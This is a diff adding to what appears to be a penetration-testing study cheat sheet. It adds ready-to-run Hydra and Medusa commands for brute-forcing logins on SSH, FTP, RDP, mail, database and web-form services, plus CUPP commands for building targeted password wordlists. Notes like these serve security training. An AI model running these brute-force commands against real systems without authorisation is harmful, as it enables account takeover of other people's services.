@@ -51,6 +51,8 @@ If hosts discovered:
   - [Cracking Passwords](#cracking-passwords)
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
+    - [Medusa](#medusa)
+    - [CUPP](#CUPP)
 
 ## 2. Service-Specific Exploitation
 - [Attacking SMB](#attacking-smb)
@@ -1034,11 +1036,80 @@ Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential
 ##### Hydra
 ```
 # Basic Auth Brute Force - User/Pass Wordlists
-hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
+hydra -L wordlist.txt -P wordlist.txt -f SERVER_IP -s PORT http-get /
 
 # Login Form Brute Force - Static User, Pass Wordlist
 hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+#ftp
+hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
+
+#ssh
+hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
+
+#http get/post
+hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+#smtp
+hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com
+
+#pop3
+hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com
+
+#imap
+hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com
+#mysql
+hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100
+
+#mssql
+hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100
+
+#vnc
+hydra -P /path/to/password_list.txt vnc://192.168.1.100
+
+#rdp
+hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100
+
+#Targeting Multiple servers
+hydra -l root -p toor -M targets.txt ssh
+
+#Nonstandard Port Use -s
+hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
+
+#Brute-Forcing a Web Login Form, Look for a successful login indicated by the HTTP status code 302.
+hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+
+#Advanced RDP Brute-Forcing, generate and test passwords ranging from 6 to 8 characters, using the specified character set.
+hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
+
+#Login Forms
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
+
+##### Medusa
+```
+#Medusa -M module, -m options, -p 'password' -P 'file.txt' -u 'username' -U users.txt
+medusa -h 10.10.10.5 -u root -P rockyou.txt -M ssh -t 4
+
+# ssh
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ssh -t 6
+
+# ftp
+medusa -h 10.10.10.5 -u anonymous -P passwords.txt -M ftp
+
+# rdp
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M rdp -t 2
+```
+
+##### CUPP
+```
+#start CUPP and aggregate details from OSINT
+cupp -i
+
+#Improve existing wordlist
+cupp -w existing.txt
+```
+
 
 ## SQLMap
 ```
